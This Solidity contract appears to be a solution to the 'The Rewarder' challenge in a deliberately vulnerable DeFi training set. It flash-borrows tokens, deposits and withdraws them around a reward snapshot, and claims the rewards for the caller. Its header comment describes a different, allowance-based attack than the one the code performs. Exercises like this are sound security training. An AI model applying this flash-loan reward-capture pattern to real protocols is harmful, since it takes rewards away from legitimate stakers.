// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// this contract will be executed on behalf of the lending pool, it will approve an allowance for the attacker EA
// thanks to this allowance which will be given during the flashloan function, the attacker will be able to spend
// the DVT tokens of the pool in a subsequent tx

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract attacker5 {

    using Address for address payable;


    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    TheRewarderPool rewarderPool;

    constructor(address tokenAddress, address rewarderPoolAddress, address RewardTokenAddress) {
        liquidityToken = DamnValuableToken(tokenAddress);
        rewardToken = RewardToken(RewardTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
    }

    function attack(address payable poolAddress, uint256 amount) external {

        FlashLoanerPool pool = FlashLoanerPool(poolAddress);
        
        // approve reward contract to transfer the token in order top be able to execute withdraw()
        liquidityToken.approve(address(rewarderPool), amount);

        // flashloan
        pool.flashLoan(amount);

    }

    function receiveFlashLoan(uint256 amount) external {

        // deposit >> the deposit function will create a new snapshot with value 
        rewarderPool.deposit(amount);

        // withdraw
        rewarderPool.withdraw(amount);

        // reimburse flashloan
        liquidityToken.transfer(msg.sender, amount);

    }

    function getRewards(address attacker) external {
        rewarderPool.distributeRewards();
        uint256 withdr_rewards = rewardToken.balanceOf(address(this));
        // 
        rewardToken.transfer(msg.sender, withdr_rewards);
    }

}